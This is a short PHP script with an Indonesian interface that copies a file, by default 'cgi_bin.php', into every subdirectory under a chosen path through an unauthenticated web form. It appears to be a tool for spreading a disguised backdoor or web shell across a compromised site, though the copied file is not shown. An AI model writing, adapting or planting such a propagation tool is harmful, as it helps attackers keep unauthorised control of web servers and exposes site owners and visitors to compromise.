<?php
$defaultDir = realpath(__DIR__); // Lokasi asli file copy.php berada
?>

<form method="POST">
    <label><b>Nama file yang akan disalin (file ini harus berada di direktori script):</b></label><br>
    <input type="text" name="filename" value="cgi_bin.php" style="width:350px;"><br><br>

    <label><b>Path direktori target (akan disalin ke semua subfolder):</b></label><br>
    <input type="text" name="targetdir" value="<?php echo htmlspecialchars($defaultDir); ?>" style="width:350px;"><br><br>

    <button type="submit">Mulai Copy</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = trim($_POST['filename']);
    $targetDir = rtrim(trim($_POST['targetdir']), '/');
    $sourceFile = __DIR__ . '/' . $filename;

    echo "<pre>";
    echo "📂 Direktori script: " . __DIR__ . "\n";
    echo "📄 File yang akan disalin: $sourceFile\n";
    echo "🎯 Target direktori: $targetDir\n\n";

    if (!file_exists($sourceFile)) {
        echo "❌ File tidak ditemukan di lokasi script: $filename\n";
        exit;
    }

    if (!is_dir($targetDir)) {
        echo "❌ Direktori target tidak valid: $targetDir\n";
        exit;
    }

    $rii = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($targetDir),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $success = 0;
    $failed = 0;

    foreach ($rii as $file) {
        if ($file->isDir()) {
            $dest = $file->getPathname() . '/' . basename($filename);
            if (copy($sourceFile, $dest)) {
                echo "✅ Copied to: $dest\n";
                $success++;
            } else {
                echo "❌ Failed to copy to: $dest\n";
                $failed++;
            }
        }
    }

    echo "\n🔚 Done. Total copied: $success | Failed: $failed\n";
    echo "</pre>";
}
?>